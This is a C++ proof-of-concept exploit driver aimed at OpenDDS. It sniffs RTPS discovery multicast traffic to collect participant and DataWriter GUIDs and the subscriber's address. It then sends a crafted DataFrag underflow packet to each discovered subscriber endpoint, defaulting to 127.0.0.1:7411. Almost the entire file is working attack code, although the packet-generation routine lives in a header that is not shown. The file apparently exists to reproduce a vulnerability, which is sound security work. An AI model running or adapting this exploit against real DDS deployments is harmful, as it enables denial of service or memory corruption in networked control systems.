/*
 * Distributed under the OpenDDS License.
 * See: http://www.opendds.org/license.html
 */

#include "POCAttacker.h"
#include <iostream>
#include <cstdlib>
#include <thread>
#include <chrono>

int main(int argc, char* argv[])
{
  POCAttacker attacker;

  std::cout << "POC Attacker: Starting GUID listeners..." << std::endl;
  
  // Start listening for SPDP packets (Participant GUIDs) on multicast 239.255.0.1:7400
  if (!attacker.startGUIDListener(7400, "239.255.0.1")) {
    std::cerr << "Failed to start SPDP listener" << std::endl;
    return -1;
  }

  // Start listening for SEDP packets (DataWriter GUIDs - Publisher GUIDs) on multicast 239.255.0.1:7401
  if (!attacker.startSEDPListener(7401, "239.255.0.1")) {
    std::cerr << "Failed to start SEDP listener" << std::endl;
    attacker.stopGUIDListener();
    return -1;
  }

  // Wait for discovery
  std::cout << "POC Attacker: Waiting for RTPS discovery packets (30 seconds)..." << std::endl;
  std::cout << "POC Attacker: Listening on SPDP multicast 239.255.0.1:7400 (Participant GUIDs)" << std::endl;
  std::cout << "POC Attacker: Listening on SEDP multicast 239.255.0.1:7401 (DataWriter/Publisher GUIDs)" << std::endl;
  std::this_thread::sleep_for(std::chrono::seconds(30));

  // Get discovered Participant GUIDs
  auto participant_guids = attacker.getDiscoveredParticipantGUIDs();
  std::cout << "POC Attacker: Discovered " << participant_guids.size() << " Participant GUID(s)" << std::endl;
  for (size_t i = 0; i < participant_guids.size(); ++i) {
    std::cout << "  Participant GUID " << (i + 1) << ": " 
              << attacker.guidToString(participant_guids[i]) << std::endl;
  }

  // Get discovered DataWriter GUIDs (Publisher GUIDs) - these are what we want!
  auto writer_guids = attacker.getDiscoveredWriterGUIDs();
  std::cout << "POC Attacker: Discovered " << writer_guids.size() << " DataWriter GUID(s) (Publisher GUIDs)" << std::endl;
  for (size_t i = 0; i < writer_guids.size(); ++i) {
    std::cout << "  Publisher GUID " << (i + 1) << ": " 
              << attacker.guidToString(writer_guids[i]) << std::endl;
  }

  // Get discovered Subscriber endpoint
  std::string subscriber_address = attacker.getDiscoveredSubscriberAddress();
  int subscriber_port = attacker.getDiscoveredSubscriberPort();
  if (subscriber_port > 0) {
    std::cout << "POC Attacker: Discovered Subscriber endpoint: " 
              << subscriber_address << ":" << subscriber_port << std::endl;
  } else {
    std::cout << "POC Attacker: No Subscriber endpoint discovered" << std::endl;
  }

  // Priority: Use DataWriter GUIDs (Publisher GUIDs) if available, otherwise use Participant GUIDs
  std::vector<OpenDDS::DCPS::GUID_t> target_guids;
  if (!writer_guids.empty()) {
    target_guids = writer_guids;
    std::cout << "POC Attacker: Using DataWriter GUIDs (Publisher GUIDs) for attack" << std::endl;
  } else if (!participant_guids.empty()) {
    target_guids = participant_guids;
    std::cout << "POC Attacker: No Publisher GUIDs found, using Participant GUIDs instead" << std::endl;
  } else {
    std::cout << "POC Attacker: No GUIDs discovered, will use default" << std::endl;
  }

  // Generate and send POC packets
  for (size_t i = 0; i < target_guids.size(); ++i) {
    std::cout << "POC Attacker: Generating POC packet for GUID " << (i + 1) 
              << ": " << attacker.guidToString(target_guids[i]) << std::endl;
    
    std::vector<char> poc_packet = attacker.generateDataFragUnderflowPacket(
      static_cast<int>(i), 
      &target_guids[i]
    );

    std::cout << "POC Attacker: Generated packet of size " << poc_packet.size() << " bytes" << std::endl;

    // Send to discovered Subscriber endpoint, or use default
    std::string target_address = (!subscriber_address.empty()) ? subscriber_address : "127.0.0.1";
    int target_port = (subscriber_port > 0) ? subscriber_port : 7411;
    std::cout << "POC Attacker: Sending to Subscriber endpoint: " << target_address << ":" << target_port << std::endl;
    if (!attacker.sendPOCPacket(poc_packet, target_address, target_port)) {
      std::cerr << "Failed to send POC packet" << std::endl;
    }

    // Wait a bit between packets
    std::this_thread::sleep_for(std::chrono::seconds(2));
  }

  // If no GUIDs discovered, send with default
  if (target_guids.empty()) {
    std::cout << "POC Attacker: Sending POC packet with default GUID" << std::endl;
    std::vector<char> poc_packet = attacker.generateDataFragUnderflowPacket(0, nullptr);
    std::string target_address = (!subscriber_address.empty()) ? subscriber_address : "127.0.0.1";
    int target_port = (subscriber_port > 0) ? subscriber_port : 7411;
    attacker.sendPOCPacket(poc_packet, target_address, target_port);
  }

  // Stop listeners
  attacker.stopGUIDListener();
  attacker.stopSEDPListener();

  std::cout << "POC Attacker: Done" << std::endl;
  return 0;
}

